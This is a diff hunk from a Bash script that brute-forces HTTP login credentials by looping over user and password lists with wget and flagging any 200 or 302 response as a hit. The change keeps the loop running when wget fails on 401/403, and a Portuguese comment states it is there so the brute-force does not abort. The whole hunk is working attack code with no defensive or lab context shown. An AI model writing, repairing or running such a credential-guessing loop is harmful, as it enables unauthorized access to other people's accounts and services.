@@ -68,7 +68,10 @@ attempt=0
 for u in "${USERS[@]}"; do
   for p in "${PASSWORDS[@]}"; do
     attempt=$((attempt + 1))
-    code="$(wget --server-response --user="${u}" --password="${p}" -O- "${URL}" 2>&1 | awk '/HTTP\//{c=$2} END{print c}')"
+    # wget devolve exit code != 0 para 401/403; nao queremos abortar o brute-force.
+    resp="$(wget --server-response --user="${u}" --password="${p}" -O- "${URL}" 2>&1 || true)"
+    code="$(printf '%s\n' "${resp}" | awk '/HTTP\//{c=$2} END{print c}')"
+    [[ -z "${code}" ]] && code="NA"
     printf '[%04d] %s:%s -> %s\n' "${attempt}" "${u}" "${p}" "${code:-NA}"
     if [[ "${code}" == "200" || "${code}" == "302" ]]; then
       echo "[+] HIT ${u}:${p} -> ${code}"
